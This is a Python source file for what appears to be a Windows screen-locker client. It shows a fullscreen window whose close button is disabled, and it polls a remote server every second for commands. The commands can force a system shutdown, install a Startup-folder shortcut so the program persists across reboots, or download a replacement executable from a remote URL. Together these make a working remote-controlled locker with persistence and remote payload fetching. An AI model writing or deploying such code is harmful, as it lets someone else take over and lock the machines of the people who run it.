import os
import sys
import time
import shutil
import webview
import requests
import threading
import subprocess
from flask import Flask

app = Flask(__name__)

destination_location = os.path.join(os.path.expanduser("~"), "AppData")
startup_shortcut_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "cslckr.lnk")

def shutdown():
    subprocess.call(['shutdown', '/s', '/t', '0'])

def create_shortcut_via_powershell(target_path, shortcut_path, description=""):
    powershell_script = f"""
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut("{shortcut_path}")
    $shortcut.TargetPath = "{target_path}"
    $shortcut.Description = "{description}"
    $shortcut.Save()
    """
    subprocess.run(["powershell", "-Command", powershell_script], check=True)

def create_shortcut():
    if getattr(sys, 'frozen', False):
        source_file = sys.executable
    else:
        source_file = os.path.abspath(__file__)

    if os.name == 'nt':
        shutil.copy(source_file, destination_location)
        create_shortcut_via_powershell(os.path.join(destination_location, "cslckrwbcl.exe"), startup_shortcut_path, "cslckrwbcl")
    else:
        print("Shortcut creation is only supported on Windows.")

if __name__ == "__main__":
    window = webview.create_window("cslckrwbcl (0.0.1)", "https://cslckrwbcl.lrdevstudio.com", frameless=True, resizable=False, fullscreen=True, draggable=False, zoomable=False)
    def set_close_handler():
        # Wait until the underlying GUI framework has initialized
        while window.gui is None:
            import time
            time.sleep(0.1)

    root = window.gui.root

    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Disable close button
    handler_thread = threading.Thread(target=set_close_handler)
    handler_thread.start()

    def check_commands():
        while True:
            try:
                response = requests.get('https://cslckrwbcl.lrdevstudio.com/messages')
                print('Checking for commands...')
                if response != []:
                    wbdata = response.json()[0]
                    action = wbdata['action']
                    if action == 'create_shortcut':
                        create_shortcut()
                        print("Shortcut Created")
                    elif action == 'shutdown':
                        shutdown()
                        print("Shutdown Initiated")
                    elif action == 'updatewbcl':
                        url = 'https://github.com/raedhashmi/cslckr/raw/refs/heads/main/cslckrwbcl.exe'
                        local_path = os.path.join(destination_location, "cslckrwbcl.exe")
                        with requests.get(url, stream=True, timeout=30) as r:
                            r.raise_for_status()
                            with open(local_path, 'wb') as f:
                                for chunk in r.iter_content(chunk_size=8192):
                                    if chunk:
                                        f.write(chunk)
                        print(f"Downloaded {local_path}")
                    elif action == 'exit':
                        print("Exiting Application")
                        window.destroy()
                        break
                    else:
                        break
            except:
                pass
            time.sleep(1)

    thread = threading.Thread(target=check_commands, daemon=True)
    thread.start()
    webview.start()